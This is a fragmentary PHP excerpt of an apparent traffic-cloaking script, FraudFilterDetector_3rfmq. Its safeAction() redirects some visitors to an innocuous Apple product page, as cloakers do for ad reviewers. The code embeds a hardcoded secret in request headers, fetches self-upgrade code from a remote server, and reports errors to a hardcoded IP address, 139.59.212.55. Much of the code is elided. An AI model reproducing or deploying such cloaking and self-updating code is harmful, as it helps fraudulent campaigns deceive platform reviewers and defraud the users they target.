...
class FraudFilterDetector_3rfmq {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'e5f0b8d7-8835-4765-a29b-58a339768c4d.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.apple.com/shop/product/HNKK2ZM/A/joby-telepod-mobile-all-in-one-tripod-for-iphone');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: e5f0b8d7-8835-4765-a29b-58a339768c4d',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: e5f0b8d7-8835-4765-a29b-58a339768c4d';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: e5f0b8d7-8835-4765-a29b-58a339768c4d';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=3rfmq&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_3rfmq = new FraudFilterDetector_3rfmq();
$fraudFilterDetector_3rfmq->check();
